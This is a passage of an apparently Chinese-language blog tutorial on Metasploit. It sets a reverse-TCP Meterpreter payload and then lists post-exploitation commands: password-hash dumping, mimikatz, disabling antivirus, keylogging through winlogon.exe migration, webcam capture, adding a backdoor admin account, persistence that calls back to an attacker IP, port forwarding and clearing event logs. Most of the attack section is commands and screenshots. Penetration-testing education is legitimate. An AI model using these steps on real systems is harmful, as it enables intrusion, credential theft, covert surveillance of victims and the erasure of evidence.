+<p>这里只有一个，有些其他的漏洞模块对操作系统的语言和版本要求的很严，比如MS08_067，这样就要我们指定目标系统的版本的。如果不设置的话，MSF会自动帮我们判断目标操作系统的版本和语言(利用目标系统的指纹特征)</p>
+<p><img src="/xie1997.github.io/xie1997.github.io/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/Metasploit%20Framework(MSF)%E7%9A%84%E4%BD%BF%E7%94%A8/1635078773007-87af7563-298b-46bf-8ebc-22cb06e51cf1.png" alt="img"></p>
+<h3 id="Payload攻击载荷模块"><a href="#Payload攻击载荷模块" class="headerlink" title="Payload攻击载荷模块"></a>Payload攻击载荷模块</h3><p>攻击载荷是我们期望在目标系统在被渗透攻击之后完成的实际攻击功能的代码，成功渗透目标后，用于在目标系统上运行任意命令。</p>
+<p>查看攻击载荷：show payloads</p>
+<p>该命令可以查看当前漏洞利用模块下可用的所有Payload</p>
+<p><img src="/xie1997.github.io/xie1997.github.io/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/Metasploit%20Framework(MSF)%E7%9A%84%E4%BD%BF%E7%94%A8/1635078771541-40e9236b-8948-4d37-badf-a6808a48fba3.png" alt="img"></p>
+<p>设置攻击载荷：set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp</p>
+<p><img src="/xie1997.github.io/xie1997.github.io/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/Metasploit%20Framework(MSF)%E7%9A%84%E4%BD%BF%E7%94%A8/1635078771854-e4abb27e-743e-4a73-b92c-5ab60379dd47.png" alt="img"></p>
+<p>查看模块需要配置的参数： show options</p>
+<p><img src="/xie1997.github.io/xie1997.github.io/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/Metasploit%20Framework(MSF)%E7%9A%84%E4%BD%BF%E7%94%A8/1635079126313-9c273ce6-4b21-46e4-b92a-cb28716c462b.png" alt="img"></p>
+<p>设置RHOST，也就是要攻击主机的ip：set RHOST 192.168.125.138</p>
+<p>设置LHOST，也就是我们主机的ip，用于接收从目标机弹回来的shell：set LHOST 192.168.125.129</p>
+<p>如果我们这里不设置lport的话，默认是4444端口监听</p>
+<p><img src="/xie1997.github.io/xie1997.github.io/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/Metasploit%20Framework(MSF)%E7%9A%84%E4%BD%BF%E7%94%A8/1635078773488-028392b7-0d69-4388-b99e-63f91ea35d0b.png" alt="img"></p>
+<p>攻击： exploit </p>
+<p><img src="/xie1997.github.io/xie1997.github.io/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/Metasploit%20Framework(MSF)%E7%9A%84%E4%BD%BF%E7%94%A8/1635079131587-d189fd84-47e1-496f-9f18-e1252d48a8f0.png" alt="img"></p>
+<h2 id="后渗透阶段"><a href="#后渗透阶段" class="headerlink" title="后渗透阶段"></a>后渗透阶段</h2><p>运行了exploit命令之后，我们开启了一个reverse TCP监听器来监听本地的 4444 端口，即我（攻击者）的本地主机地址（LHOST）和端口号（LPORT）。运行成功之后，我们将会看到命令提示符 meterpreter &gt; 出现，我们输入： shell 即可切换到目标主机的windows shell，要想从目标主机shell退出到 meterpreter ，我们只需输入：exit</p>
+<p><img src="/xie1997.github.io/xie1997.github.io/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/Metasploit%20Framework(MSF)%E7%9A%84%E4%BD%BF%E7%94%A8/1635079162991-b4890595-349b-4404-b3d4-9f2f3d6ce53c.png" alt="img"></p>
+<p>我们要想从 meterpreter 退出到MSF框架，输入：background</p>
+<p><img src="/xie1997.github.io/xie1997.github.io/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/Metasploit%20Framework(MSF)%E7%9A%84%E4%BD%BF%E7%94%A8/1635079181975-b19d2875-cbd0-4396-bea6-4c6e1fcb60c0.png" alt="img"><br>输入： sessions -l 查看我们获得的shell，前面有id</p>
+<p>输入： sessions -i 1 即可切换到id为1的shell</p>
+<p><img src="/xie1997.github.io/xie1997.github.io/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/Metasploit%20Framework(MSF)%E7%9A%84%E4%BD%BF%E7%94%A8/1635078774547-eeaab652-fa7c-4fb4-a23b-97522c63e963.png" alt="img"></p>
+<p>输入：shell 即可进入 cmd 类型的控制，再输入：powershell ，即可进入 powershell 类型的控制台</p>
+<p><img src="/xie1997.github.io/xie1997.github.io/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/Metasploit%20Framework(MSF)%E7%9A%84%E4%BD%BF%E7%94%A8/1635078775696-62f88276-f870-46ed-a0c9-d560c513c74a.png" alt="img"></p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">sysinfo             <span class="token comment">#查看目标主机系统信息</span>
+run scraper         <span class="token comment">#查看目标主机详细信息</span>
+run hashdump        <span class="token comment">#导出密码的哈希</span>
+load kiwi           <span class="token comment">#加载mimikatz</span>
+ps                  <span class="token comment">#查看目标主机进程信息</span>
+pwd                 <span class="token comment">#查看目标当前目录(windows)</span>
+getlwd              <span class="token comment">#查看目标当前目录(Linux)</span>
+search <span class="token operator">-</span>f <span class="token operator">*</span><span class="token punctuation">.</span>jsp <span class="token operator">-</span>d e<span class="token punctuation">:</span>\                <span class="token comment">#搜索E盘中所有以.jsp为后缀的文件</span>
+download  e<span class="token punctuation">:</span>\test<span class="token punctuation">.</span>txt  <span class="token operator">/</span>root          <span class="token comment">#将目标机的e:\test.txt文件下载到/root目录下</span>
+upload    <span class="token operator">/</span>root<span class="token operator">/</span>test<span class="token punctuation">.</span>txt d<span class="token punctuation">:</span>\test      <span class="token comment">#将/root/test.txt上传到目标机的 d:\test\ 目录下</span>
+getpid              <span class="token comment">#查看当前Meterpreter Shell的进程PID</span>
+migrate <span class="token number">1384</span>        <span class="token comment">#将当前Meterpreter Shell的进程迁移到PID为1384的进程上</span>
+idletime            <span class="token comment">#查看主机运行时间</span>
+getuid              <span class="token comment">#查看获取的当前权限</span>
+getsystem           <span class="token comment">#提权,获得的当前用户是administrator才能成功</span>
+run  killav         <span class="token comment">#关闭杀毒软件</span>
+screenshot          <span class="token comment">#截图</span>
+webcam_list         <span class="token comment">#查看目标主机的摄像头</span>
+webcam_snap         <span class="token comment">#拍照</span>
+webcam_stream       <span class="token comment">#开视频</span>
+execute  参数  <span class="token operator">-</span>f 可执行文件   <span class="token comment">#执行可执行程序</span>
+run getgui <span class="token operator">-</span>u hack <span class="token operator">-</span>p <span class="token number">123</span>    <span class="token comment">#创建hack用户，密码为123</span>
+run getgui <span class="token operator">-</span>e                <span class="token comment">#开启远程桌面</span>
+keyscan_start                <span class="token comment">#开启键盘记录功能</span>
+keyscan_dump                 <span class="token comment">#显示捕捉到的键盘记录信息</span>
+keyscan_stop                 <span class="token comment">#停止键盘记录功能</span>
+uictl  disable  keyboard     <span class="token comment">#禁止目标使用键盘</span>
+uictl  enable   keyboard     <span class="token comment">#允许目标使用键盘</span>
+uictl  disable  mouse        <span class="token comment">#禁止目标使用鼠标</span>
+uictl  enable   mouse        <span class="token comment">#允许目标使用鼠标</span>
+load                         <span class="token comment">#使用扩展库</span>
+run				             <span class="token comment">#使用扩展库</span>
+
+run persistence <span class="token operator">-</span>X <span class="token operator">-</span>i <span class="token number">5</span> <span class="token operator">-</span>p <span class="token number">8888</span> <span class="token operator">-</span>r <span class="token number">192.168</span><span class="token number">.10</span><span class="token number">.27</span>        <span class="token comment">#反弹时间间隔是5s 会自动连接192.168.27的4444端口，缺点是容易被杀毒软件查杀</span>
+portfwd add <span class="token operator">-</span>l <span class="token number">3389</span> <span class="token operator">-</span>r <span class="token number">192.168</span><span class="token number">.11</span><span class="token number">.13</span> <span class="token operator">-</span>p <span class="token number">3389</span>     <span class="token comment">#将192.168.11.13的3389端口转发到本地的3389端口上，这里的192.168.11.13是获取权限的主机的ip地址</span>
+clearev                       <span class="token comment">#清除日志</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="Post-后渗透模块"><a href="#Post-后渗透模块" class="headerlink" title="Post 后渗透模块"></a>Post 后渗透模块</h3><p>该模块主要用于在取得目标主机系统远程控制权后，进行一系列的后渗透攻击动作。</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">run post<span class="token operator">/</span>windows<span class="token operator">/</span>manage<span class="token operator">/</span>migrate           <span class="token comment">#自动进程迁移</span>
+run post<span class="token operator">/</span>windows<span class="token operator">/</span>gather<span class="token operator">/</span>checkvm           <span class="token comment">#查看目标主机是否运行在虚拟机上</span>
+run post<span class="token operator">/</span>windows<span class="token operator">/</span>manage<span class="token operator">/</span>killav            <span class="token comment">#关闭杀毒软件</span>
+run post<span class="token operator">/</span>windows<span class="token operator">/</span>manage<span class="token operator">/</span>enable_rdp        <span class="token comment">#开启远程桌面服务</span>
+run post<span class="token operator">/</span>windows<span class="token operator">/</span>manage<span class="token operator">/</span>autoroute         <span class="token comment">#查看路由信息</span>
+run post<span class="token operator">/</span>windows<span class="token operator">/</span>gather<span class="token operator">/</span>enum_logged_on_users    <span class="token comment">#列举当前登录的用户</span>
+run post<span class="token operator">/</span>windows<span class="token operator">/</span>gather<span class="token operator">/</span>enum_applications       <span class="token comment">#列举应用程序</span>
+run post<span class="token operator">/</span>windows<span class="token operator">/</span>gather<span class="token operator">/</span>credentials<span class="token operator">/</span>windows_autologin <span class="token comment">#抓取自动登录的用户名和密码</span>
+run post<span class="token operator">/</span>windows<span class="token operator">/</span>gather<span class="token operator">/</span>smart_hashdump               <span class="token comment">#dump出所有用户的hash</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>输入：sysinfo 查看目标主机的信息</p>
+<p><img src="/xie1997.github.io/xie1997.github.io/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/Metasploit%20Framework(MSF)%E7%9A%84%E4%BD%BF%E7%94%A8/1635078775312-d3f47c3f-a73c-4e7b-ab14-a9ad2572c670.png" alt="img"></p>
+<h3 id="查看主机是否运行在虚拟机上"><a href="#查看主机是否运行在虚拟机上" class="headerlink" title="查看主机是否运行在虚拟机上"></a>查看主机是否运行在虚拟机上</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">run post<span class="token operator">/</span>windows<span class="token operator">/</span>gather<span class="token operator">/</span>checkvm<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/xie1997.github.io/xie1997.github.io/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/Metasploit%20Framework(MSF)%E7%9A%84%E4%BD%BF%E7%94%A8/1635078776010-73c4ad13-dd9b-4af5-a50e-899aacdd56b7.png" alt="img"></p>
+<h3 id="关闭杀毒软件"><a href="#关闭杀毒软件" class="headerlink" title="关闭杀毒软件"></a>关闭杀毒软件</h3><p>拿到目标主机的shell后第一件事就是关闭掉目标主机的杀毒软件，通过命令：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">run  killav<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/xie1997.github.io/xie1997.github.io/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/Metasploit%20Framework(MSF)%E7%9A%84%E4%BD%BF%E7%94%A8/1635078777810-d99a0dfb-89a3-4c47-a692-55c7bf70bf6e.png" alt="img"></p>
+<h3 id="获取目标主机的详细信息"><a href="#获取目标主机的详细信息" class="headerlink" title="获取目标主机的详细信息"></a>获取目标主机的详细信息</h3><p>使用命令：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">run scraper <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>它将目标机器上的常见信息收集起来然后下载保存在本地</p>
+<p><img src="/xie1997.github.io/xie1997.github.io/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/Metasploit%20Framework(MSF)%E7%9A%84%E4%BD%BF%E7%94%A8/1635078794399-39d79d8a-57de-466d-b4f8-3d7c26517cc0.png" alt="img"></p>
+<h3 id="访问文件系统"><a href="#访问文件系统" class="headerlink" title="访问文件系统"></a>访问文件系统</h3><p>Meterpreter支持非常多的文件系统命令（基本跟Linux系统命令类似），一些常用命令如下：</p>
+<ul>
+<li>cd：切换目标目录；</li>
+<li>cat：读取文件内容；</li>
+<li>rm：删除文件；</li>
+<li>edit：使用vim编辑文件</li>
+<li>ls：获取当前目录下的文件；</li>
+<li>mkdir：新建目录；</li>
+<li>rmdir：删除目录；</li>
+</ul>
+<p><img src="/xie1997.github.io/xie1997.github.io/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/Metasploit%20Framework(MSF)%E7%9A%84%E4%BD%BF%E7%94%A8/1635079267383-0ab3d680-208d-4268-b854-baf493a43da2.png" alt="img"></p>
+<h3 id="上传-x2F-下载文件"><a href="#上传-x2F-下载文件" class="headerlink" title="上传&#x2F;下载文件"></a>上传&#x2F;下载文件</h3><ul>
+<li>download file 命令可以帮助我们从目标系统中下载文件</li>
+<li>upload file 命令则能够向目标系统上传文件。</li>
+</ul>
+<h3 id><a href="#" class="headerlink" title></a><img src="/xie1997.github.io/xie1997.github.io/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/Metasploit%20Framework(MSF)%E7%9A%84%E4%BD%BF%E7%94%A8/1635079273047-f036875b-82ba-468c-94e6-534c402c29ac.png" alt="img"></h3><p>权限提升</p>
+<p>有的时候，你可能会发现自己的 Meterpreter 会话受到了用户权限的限制，而这将会严重影响你在目标系统中的活动。比如说，修改注册表、安装后门或导出密码等活动都需要提升用户权限，而Meterpreter给我们提供了一个getsystem 命令，它可以使用多种技术在目标系统中实现提权：</p>
+<p>getuid 命令可以获取当前用户的信息，可以看到，当我们使用 getsystem进行提权后，用户身材为 NT AUTHORITY\SYSTEM ，这个也就是Windows的系统权限。</p>
+<p>注：执行getsystem命令后，会显示错误，但是其实已经运行成功了！</p>
+<p><img src="/xie1997.github.io/xie1997.github.io/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/Metasploit%20Framework(MSF)%E7%9A%84%E4%BD%BF%E7%94%A8/1635078779230-daa3e05c-2119-45cb-a8f0-e4b9705b8cda.png" alt="img"></p>
+<h3 id="获取用户密码"><a href="#获取用户密码" class="headerlink" title="获取用户密码"></a>获取用户密码</h3><p>传送门：<a target="_blank" rel="noopener" href="https://xie1997.blog.csdn.net/article/details/105815134">MSF中获取用户密码</a></p>
+<h3 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h3><p>先查看目标主机安装了哪些应用</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">run post<span class="token operator">/</span>windows<span class="token operator">/</span>gather<span class="token operator">/</span>enum_applications<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/xie1997.github.io/xie1997.github.io/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/Metasploit%20Framework(MSF)%E7%9A%84%E4%BD%BF%E7%94%A8/1635078783102-ef43e4f3-5708-4ac0-ab9a-3d5b3d8ed515.png" alt="img"></p>
+<p>我们还可以使用 execute 命令在目标系统中执行应用程序。这个命令的使用方法如下：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">execute  参数  <span class="token operator">-</span>f 可执行文件  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>运行后它将执行所指定的命令。可选参数如下：</p>
+<ul>
+<li>-f：指定可执行文件</li>
+<li>-H：创建一个隐藏进程</li>
+<li>-a：传递给命令的参数</li>
+<li>-i： 跟进程进行交互</li>
+<li>-m：从内存中执行</li>
+<li>-t： 使用当前伪造的线程令牌运行进程</li>
+<li>-s： 在给定会话中执行进程</li>
+</ul>
+<p><img src="/xie1997.github.io/xie1997.github.io/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/Metasploit%20Framework(MSF)%E7%9A%84%E4%BD%BF%E7%94%A8/1635078782626-a8e1c640-db76-438c-a2da-8767e20db925.png" alt="img"></p>
+<h3 id="屏幕截图"><a href="#屏幕截图" class="headerlink" title="屏幕截图"></a>屏幕截图</h3><p>输入：screenshot ，截图目标主机屏幕，可以看到，图片被保存到了 &#x2F;root 目录下</p>
+<p><img src="/xie1997.github.io/xie1997.github.io/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/Metasploit%20Framework(MSF)%E7%9A%84%E4%BD%BF%E7%94%A8/1635078781022-dee60995-881b-4564-bd8a-080ca83ad47b.png" alt="img"></p>
+<h3 id="创建一个新账号"><a href="#创建一个新账号" class="headerlink" title="创建一个新账号"></a>创建一个新账号</h3><p>先查看目标主机有哪些用户</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">run post<span class="token operator">/</span>windows<span class="token operator">/</span>gather<span class="token operator">/</span>enum_logged_on_users<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/xie1997.github.io/xie1997.github.io/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/Metasploit%20Framework(MSF)%E7%9A%84%E4%BD%BF%E7%94%A8/1635078788166-a319bb4f-4f5a-4cd7-8ef7-d125a2ac4e18.png" alt="img"></p>
+<p>接下来，我们可以在目标系统中创建一个新的用户账号：run getgui -u hack -p 123，这个命令会创建用户，并把他添加到 Administrators 组中，这样该用户就拥有远程桌面的权限了。</p>
+<p>这里成功创建了用户，但是添加到Administrators组中失败了 !</p>
+<p><img src="/xie1997.github.io/xie1997.github.io/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/Metasploit%20Framework(MSF)%E7%9A%84%E4%BD%BF%E7%94%A8/1635079330574-f45269c0-670f-46c6-b8da-9b1207042581.png" alt="img"><br>如果添加到Administrators组中失败了的话，我们可以运行：shell ，进行cmd窗口手动将该用户添加到administrators组中。</p>
+<h3 id="启用远程桌面"><a href="#启用远程桌面" class="headerlink" title="启用远程桌面"></a>启用远程桌面</h3><p>当我们新添加的用户已经拥有远程桌面之后，我们就可以使用这个账号凭证来开启远程桌面会话了。</p>
+<p>首先，我们需要确保目标Windows设备开启了远程桌面功能（需要开启多个服务），不过我们的 getgui 脚本可以帮我们搞定。我们可以使用-e参数确保目标设备开启了远程桌面功能（重启之后同样会自动开启），我们输入：run getgui -e 或者 run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp</p>
+<p>在开启远程桌面会话之前，我们还需要使用“idletime”命令检查远程用户的空闲时长： idletime</p>
+<p><img src="/xie1997.github.io/xie1997.github.io/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/Metasploit%20Framework(MSF)%E7%9A%84%E4%BD%BF%E7%94%A8/1635078791320-ae7b693f-e3e7-4819-8d7a-c7b09cc92537.png" alt="img"></p>
+<p>然后我们就可以使用远程桌面用我们创建的用户远程登录目标主机了。由于上一步创建的用户没有被添加到远程桌面用户组中，所以这一步就没法演示。 </p>
+<h3 id="键盘记录"><a href="#键盘记录" class="headerlink" title="键盘记录"></a>键盘记录</h3><p>Meterpreter还可以在目标设备上实现键盘记录功能，键盘记录主要涉及以下三种命令：</p>
+<ul>
+<li>keyscan_start：开启键盘记录功能</li>
+<li>keyscan_dump：显示捕捉到的键盘记录信息</li>
+<li>keyscan_stop：停止键盘记录功能</li>
+</ul>
+<p>不过在使用键盘记录功能时，通常需要跟目标进程进行绑定，接下来我们介绍如何绑定进程，然后获取该进程下的键盘记录 </p>
+<h3 id="进程迁移"><a href="#进程迁移" class="headerlink" title="进程迁移"></a>进程迁移</h3><p>Meterpreter 既可以单独运行，也可以与其他进程进行绑定。因此，我们可以让Meterpreter与类似explorer.exe这样的进程进行绑定，并以此来实现持久化。</p>
+<p>在下面的例子中，我们会将Meterpreter跟 winlogon.exe 绑定，并在登录进程中捕获键盘记录，以获得用户的密码。</p>
+<p>首先，我们需要使用： ps 命令查看目标设备中运行的进程：</p>
+<p><img src="/xie1997.github.io/xie1997.github.io/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/Metasploit%20Framework(MSF)%E7%9A%84%E4%BD%BF%E7%94%A8/1635078785138-2c9ce33a-4430-4a7b-bfd5-b581c546b3ec.png" alt="img"></p>
+<p>我们可以使用： getpid 查看我们当前的进程id</p>
+<p>使用： migrate 目标进程ID 命令来绑定目标进程id，这里绑定目标pid的时候，经常会断了 shell。进程迁移后会自动关闭原来进程，没有关闭可使用 kill pid 命令关闭进程。或者使用自动迁移进程（run post&#x2F;windows&#x2F;manage&#x2F;migrate）命令，系统会自动寻找合适的进程然后迁移。</p>
+<p><img src="/xie1997.github.io/xie1997.github.io/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/Metasploit%20Framework(MSF)%E7%9A%84%E4%BD%BF%E7%94%A8/1635079415897-1bb09b2e-9083-45f7-8c54-1d79ff6ff047.png" alt="img"></p>
+<p>绑定完成之后，我们就可以开始捕获键盘数据了，可以看到，用户输入了 123 然后回车，说明密码是 123</p>
+<p><img src="/xie1997.github.io/xie1997.github.io/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/Metasploit%20Framework(MSF)%E7%9A%84%E4%BD%BF%E7%94%A8/1635078787502-f0560951-2297-402c-b330-fdaec86c541e.png" alt="img"></p>
+<h3 id="禁止目标主机使用键盘鼠标"><a href="#禁止目标主机使用键盘鼠标" class="headerlink" title="禁止目标主机使用键盘鼠标"></a>禁止目标主机使用键盘鼠标</h3><ul>
+<li>禁止(允许)目标使用键盘： uictl disable (enable) keyboard</li>
+<li>禁止(允许)目标使用鼠标： uictl disable (enable) mouse</li>
+</ul>
+<h3 id="用目标主机摄像头拍照"><a href="#用目标主机摄像头拍照" class="headerlink" title="用目标主机摄像头拍照"></a>用目标主机摄像头拍照</h3><ul>
+<li>获取目标系统的摄像头列表：webcam_list</li>
+<li>从指定的摄像头，拍摄照片：webcam_snap</li>
+<li>从指定的摄像头，开启视频：webcam_stream</li>
+</ul>
+<p>可以看到啊，目标主机有一个摄像头</p>
+<p><img src="/xie1997.github.io/xie1997.github.io/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/Metasploit%20Framework(MSF)%E7%9A%84%E4%BD%BF%E7%94%A8/1635078791387-aa2f942f-f921-4cc9-8c54-153ea9d3fd80.png" alt="img"></p>
+<p>于是，我们拍一张照片看看，可以看到，已经拍完了照，并且显示出来了</p>
+<p><img src="/xie1997.github.io/xie1997.github.io/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/Metasploit%20Framework(MSF)%E7%9A%84%E4%BD%BF%E7%94%A8/1635078794382-bc328e2d-af62-44d2-9c05-59e36c4cd6ee.png" alt="img"></p>
+<p>我们再来开启视频试试，开启摄像头拍摄视频。他会弹出一个网页，可以查看到摄像头那端的实时操作，相当于直播</p>
+<p><img src="/xie1997.github.io/xie1997.github.io/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/Metasploit%20Framework(MSF)%E7%9A%84%E4%BD%BF%E7%94%A8/1635078801019-de3b995d-7d46-4a00-b19f-40058c3c64d9.png" alt="img"></p>
+<h3 id="使用扩展库"><a href="#使用扩展库" class="headerlink" title="使用扩展库"></a>使用扩展库</h3><p>输入 load 或者 run 然后双击table</p>
+<p><img src="/xie1997.github.io/xie1997.github.io/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/Metasploit%20Framework(MSF)%E7%9A%84%E4%BD%BF%E7%94%A8/1635078802141-2aacfb8b-3dc9-4552-9d2d-b5a5f0cfa286.png" alt="img"></p>
+<h3 id="生成持续性后门"><a href="#生成持续性后门" class="headerlink" title="生成持续性后门"></a>生成持续性后门</h3><p>因为 meterpreter 是基于内存DLL建立的连接，所以，只要目标主机关机，我们的连接就会断。总不可能我们每次想连接的时候，每次都去攻击，然后再利用 meterpreter 建立连接。所以，我们得在目标主机系统内留下一个持续性的后门，只要目标主机开机了，我们就可以连接到该主机。</p>
+<p>建立持续性后门有两种方法，一种是通过<strong>启动项启动(persistence) ，</strong>一种是通过 <strong>服务启动(metsvc)</strong></p>
+<p><strong>启动项启动</strong></p>
+<p>启动项启动的话，我们先生成一个后门工具，传送门——&gt; <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36119192/article/details/83869141">用MSF生成一个后门木马</a></p>
+<p>然后放到windows的启动目录中：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">C<span class="token punctuation">:</span>\Users\$username$\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>这样这个后门每次开机就都能启动了，然后我们只要相连就监听相应的端口就行了。</p>
+<p><strong>服务启动</strong></p>
+<p>通过服务启动，我们可以运行命令 </p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">run persistence <span class="token operator">-</span>X <span class="token operator">-</span>i <span class="token number">5</span> <span class="token operator">-</span>p <span class="token number">8888</span> <span class="token operator">-</span>r <span class="token number">192.168</span><span class="token number">.10</span><span class="token number">.27</span>  <span class="token comment">#反弹时间间隔是5s 会自动连接192.168.27的4444端口，缺点是容易被杀毒软件查杀</span>
+
+<span class="token comment">#然后它就在目标机新建了这个文件：C:\Windows\TEMP\CJzhFlNOWa.vbs ，并把该服务加入了注册表中，只要开机就会启动</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/xie1997.github.io/xie1997.github.io/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/Metasploit%20Framework(MSF)%E7%9A%84%E4%BD%BF%E7%94%A8/1635078796450-76bebe45-bbd4-431a-a460-cca851fc2914.png" alt="img">我们在被攻击机可以看到这个文件，是一个VBScript脚本</p>
+<p><img src="/xie1997.github.io/xie1997.github.io/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/Metasploit%20Framework(MSF)%E7%9A%84%E4%BD%BF%E7%94%A8/1635078796264-3a17247c-6b1b-463e-97ae-9b19e5790b70.png" alt="img"></p>
+<p>查看靶机的端口连接情况，可以看到靶机连着我们的8888端口</p>
+<p><img src="/xie1997.github.io/xie1997.github.io/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/Metasploit%20Framework(MSF)%E7%9A%84%E4%BD%BF%E7%94%A8/1635078796363-984c9dd7-cb82-436b-adde-1c6786e571c5.png" alt="img"></p>
+<h3 id="设置Socks代理"><a href="#设置Socks代理" class="headerlink" title="设置Socks代理"></a>设置Socks代理</h3><p>传送门：<a target="_blank" rel="noopener" href="https://xie1997.blog.csdn.net/article/details/105872076">MSF搭建socks代理</a></p>
+<h3 id="portfwd端口转发"><a href="#portfwd端口转发" class="headerlink" title="portfwd端口转发"></a>portfwd端口转发</h3><p>portfwd 是meterpreter提供的一种基本的端口转发。porfwd可以反弹单个端口到本地，并且监听，使用方法如下</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">portfwd add <span class="token operator">-</span>l <span class="token number">3389</span> <span class="token operator">-</span>r <span class="token number">192.168</span><span class="token number">.11</span><span class="token number">.13</span> <span class="token operator">-</span>p <span class="token number">3389</span>     <span class="token comment">#将192.168.11.13的3389端口转发到本地的3389端口上，这里的192.168.11.13是获取权限的主机的ip地址</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="-1"><a href="#-1" class="headerlink" title></a><img src="/xie1997.github.io/xie1997.github.io/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/Metasploit%20Framework(MSF)%E7%9A%84%E4%BD%BF%E7%94%A8/1635078801409-5ae25a7c-8f76-4bf7-bbf9-771cea414aa3.png" alt="img"></h3><p>然后我们只要访问本地的3389端口就可以连接到目标主机的3389端口了</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">rdesktop <span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">3389</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/xie1997.github.io/xie1997.github.io/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/Metasploit%20Framework(MSF)%E7%9A%84%E4%BD%BF%E7%94%A8/1635078800650-954c464c-fb32-404f-8e9c-ffef3af624de.png" alt="img"></p>
+<h3 id="清除事件日志"><a href="#清除事件日志" class="headerlink" title="清除事件日志"></a>清除事件日志</h3><p>完成攻击操作之后，千万别忘了“打扫战场”。我们的所有操作都会被记录在目标系统的日志文件之中，因此我们需要在完成攻击之后使用命令 clearev 命令来清除事件日志：</p>
+<p><img src="/xie1997.github.io/xie1997.github.io/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/Metasploit%20Framework(MSF)%E7%9A%84%E4%BD%BF%E7%94%A8/1635079508696-dd383299-2766-4f60-9661-c0a9f07ec885.png" alt="img"></p>
